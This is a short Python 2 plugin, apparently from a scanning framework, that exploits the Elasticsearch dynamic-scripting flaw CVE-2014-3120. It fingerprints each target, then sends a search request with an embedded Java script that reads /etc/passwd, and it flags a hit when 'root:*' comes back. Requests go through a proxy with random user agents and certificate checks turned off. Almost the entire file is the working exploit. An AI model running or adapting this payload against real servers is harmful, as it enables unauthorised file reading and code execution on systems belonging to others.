#!/usr/bin/env python
# coding:utf-8
import logging
import lib.requests as requests
import random
from lib.config import (
    PASSWORD_DIC, MY_PROXY, USER_AGENT_LIST
)

def plugin_info():
    return {
        "name": "Elasticsearch",
        "info": "Elasticsearch < 1.20,CVE-2014-3120",
        "Author":"Jaqen",
        "Create_date":"2018-11-26",
        "link":"https://www.exploit-db.com/exploits/33370"
    }

def exploit(ip):
    result = []
    if Domain:
        for domain in Domain:
            try:
                url = domain+'/'
                resp = requests.get(url, timeout=TIME_OUT, proxies=MY_PROXY, headers={"User-Agent": random.choice(USER_AGENT_LIST)}, allow_redirects=True, verify=False)
            except Exception,e:
                logging.error(e)
                continue
            if "You Know, for Search" in resp.text:
                result.append('%s/ >>>> 发现存在Elasticsearch'%domain)
            try:
                resp = requests.post(domain+"/_search?pretty", data="""{
      "size": 1,
      "query": {
        "filtered": {
          "query": {
            "match_all": {}
          }
        }
      },
      "script_fields": {
        "/etc/passwd": {
          "script": "import java.util.;\\nimport java.io.;\\nnew Scanner(new File(\\"/etc/passwd\\")).useDelimiter(\\"\\\\Z\\").next();"
        }
      }
    }""", timeout=TIME_OUT, proxies=MY_PROXY, headers={"User-Agent": random.choice(USER_AGENT_LIST)}, allow_redirects=True, verify=False)
                if "root:*" in resp.text:
                    result.append('%s/_search?pretty >>>> 发现存在Elasticsearch远程命令执行' % domain)
            except Exception,e:
                logging.error(e)
                continue
        if len(result):
            return result